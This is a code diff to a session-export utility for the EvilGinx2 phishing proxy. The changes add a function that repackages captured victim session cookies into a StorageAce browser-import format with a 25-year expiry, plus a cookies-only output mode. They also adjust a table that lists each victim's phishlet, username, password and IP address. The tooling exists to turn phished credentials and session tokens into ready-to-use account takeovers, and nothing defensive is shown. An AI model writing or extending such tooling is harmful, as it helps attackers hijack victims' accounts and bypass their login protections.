@@ -2,7 +2,6 @@
 
 # Export EvilGinx2 sessions utility - exact format match
 # Usage: ./export_sessions.sh [session_id] [format]
-# Formats: text (default), json, csv
 
 SESSION_ID="$1"
 FORMAT="${2:-text}"
@@ -45,10 +44,48 @@ type Session struct {
 }
 
 type CookieToken struct {
-    Name     string `json:"name"`
-    Value    string `json:"value"`
-    Path     string `json:"path"`
-    HttpOnly bool   `json:"httpOnly"`
+    Name     string `json:"Name"`      // Capital N to match evilginx2 format
+    Value    string `json:"Value"`     // Capital V to match evilginx2 format
+    Path     string `json:"Path"`      // Capital P to match evilginx2 format
+    HttpOnly bool   `json:"HttpOnly"`  // Capital H to match evilginx2 format
+}
+
+type StorageAceCookie struct {
+    Path           string `json:"path"`
+    Domain         string `json:"domain"`
+    ExpirationDate int64  `json:"expirationDate"`
+    Value          string `json:"value"`
+    Name           string `json:"name"`
+    HttpOnly       bool   `json:"httpOnly"`
+    HostOnly       bool   `json:"hostOnly"`
+    Secure         bool   `json:"secure"`
+    Session        bool   `json:"session"`
+}
+
+func formatCookiesForStorageAce(session Session) []StorageAceCookie {
+    var cookieArray []StorageAceCookie
+    
+    // Calculate expiration date (25 years from now, like evilginx2)
+    expirationDate := time.Now().Unix() + (25 * 365 * 24 * 3600)
+    
+    for domain, cookies := range session.CookieTokens {
+        for _, cookie := range cookies {
+            storageAceCookie := StorageAceCookie{
+                Path:           "/",  // Default path like in evilginx2
+                Domain:         domain,
+                ExpirationDate: expirationDate,
+                Value:          cookie.Value,  // Use capital V from evilginx2
+                Name:           cookie.Name,   // Use capital N from evilginx2
+                HttpOnly:       cookie.HttpOnly, // Use capital H from evilginx2
+                HostOnly:       true,
+                Secure:         false,
+                Session:        false,
+            }
+            cookieArray = append(cookieArray, storageAceCookie)
+        }
+    }
+    
+    return cookieArray
 }
 
 func printSessionEvilginx2Style(session Session) {
@@ -72,27 +109,7 @@ func printSessionEvilginx2Style(session Session) {
     // Print cookies in exact evilginx2 format if they exist
     if len(session.CookieTokens) > 0 {
         fmt.Printf("\n[ cookies ]\n")
-        var cookieArray []map[string]interface{}
-        
-        for domain, cookies := range session.CookieTokens {
-            for _, cookie := range cookies {
-                // Use current timestamp + 25 years for expiration (like evilginx2)
-                expirationDate := time.Now().Unix() + (25 * 365 * 24 * 3600)
-                
-                cookieMap := map[string]interface{}{
-                    "path":           "/",  // Default path like in evilginx2
-                    "domain":         domain,
-                    "expirationDate": expirationDate,
-                    "value":          cookie.Value,
-                    "name":           cookie.Name,
-                    "httpOnly":       cookie.HttpOnly,
-                    "hostOnly":       true,
-                    "secure":         false,
-                    "session":        false,
-                }
-                cookieArray = append(cookieArray, cookieMap)
-            }
-        }
+        cookieArray := formatCookiesForStorageAce(session)
         
         // Print cookies in exact JSON format like evilginx2
         cookieJSON, _ := json.Marshal(cookieArray)
@@ -104,6 +121,16 @@ func printSessionEvilginx2Style(session Session) {
     fmt.Printf("\n")
 }
 
+func printCookiesOnly(session Session) {
+    if len(session.CookieTokens) > 0 {
+        cookieArray := formatCookiesForStorageAce(session)
+        cookieJSON, _ := json.Marshal(cookieArray)
+        fmt.Printf("%s\n", string(cookieJSON))
+    } else {
+        fmt.Printf("No cookies found for session %d\n", session.Id)
+    }
+}
+
 func printAllSessionsTable(sessions []Session) {
     if len(sessions) == 0 {
         fmt.Printf("No saved sessions found\n")
@@ -111,9 +138,9 @@ func printAllSessionsTable(sessions []Session) {
     }
     
     // Print table header exactly like evilginx2
-    fmt.Printf("\n+-----+-----------------+---------------+-----------------+-----------+-----------------+-------------------+\n")
-    fmt.Printf("| id  |    phishlet     |   username    |    password     |  tokens   |   remote ip     |       time        |\n")
-    fmt.Printf("+-----+-----------------+---------------+-----------------+-----------+-----------------+-------------------+\n")
+    fmt.Printf("\n+-----+-----------------+---------------+-----------------+-----------+----------------+-------------------+\n")
+    fmt.Printf("| id  |    phishlet     |   username    |    password     |  tokens   |   remote ip    |       time        |\n")
+    fmt.Printf("+-----+-----------------+---------------+-----------------+-----------+----------------+-------------------+\n")
     
     for _, session := range sessions {
         // Truncate long values to fit in table
@@ -133,8 +160,8 @@ func printAllSessionsTable(sessions []Session) {
         }
         
         remoteIP := session.RemoteAddr
-        if len(remoteIP) > 15 {
-            remoteIP = remoteIP[:12] + "..."
+        if len(remoteIP) > 14 {
+            remoteIP = remoteIP[:11] + "..."
         }
         
         tokens := "none"
@@ -144,11 +171,11 @@ func printAllSessionsTable(sessions []Session) {
         
         timeStr := time.Unix(session.CreateTime, 0).Format("2006-01-02 15:04")
         
-        fmt.Printf("| %-3d | %-15s | %-13s | %-15s | %-9s | %-15s | %-17s |\n",
+        fmt.Printf("| %-3d | %-15s | %-13s | %-15s | %-9s | %-14s | %-17s |\n",
             session.Id, phishlet, username, password, tokens, remoteIP, timeStr)
     }
     
-    fmt.Printf("+-----+-----------------+---------------+-----------------+-----------+-----------------+-------------------+\n")
+    fmt.Printf("+-----+-----------------+---------------+-----------------+-----------+----------------+-------------------+\n")
     fmt.Printf("\n")
 }
 
@@ -212,13 +239,14 @@ func main() {
     
     switch format {
     case "json":
-        for _, session := range sessions {
+        for i, session := range sessions {
             sessionJSON, _ := json.MarshalIndent(session, "", "  ")
-            fmt.Printf("%s\n", string(sessionJSON))
-            if len(sessions) > 1 {
+            fmt.Printf("%s", string(sessionJSON))
+            if i < len(sessions)-1 {
                 fmt.Printf("\n---\n")
             }
         }
+        fmt.Printf("\n")
     case "csv":
         fmt.Printf("id,phishlet,username,password,landing_url,user_agent,remote_ip,create_time,update_time\n")
         for _, session := range sessions {
@@ -229,6 +257,12 @@ func main() {
         }
     case "table":
         printAllSessionsTable(sessions)
+    case "cookies":
+        for _, session := range sessions {
+            fmt.Printf("=== Session %d Cookies ===\n", session.Id)
+            printCookiesOnly(session)
+            fmt.Printf("\n")
+        }
     default: // text format (evilginx2 style)
         if sessionIdStr == "all" {
             // Show table first, then detailed view for sessions with tokens
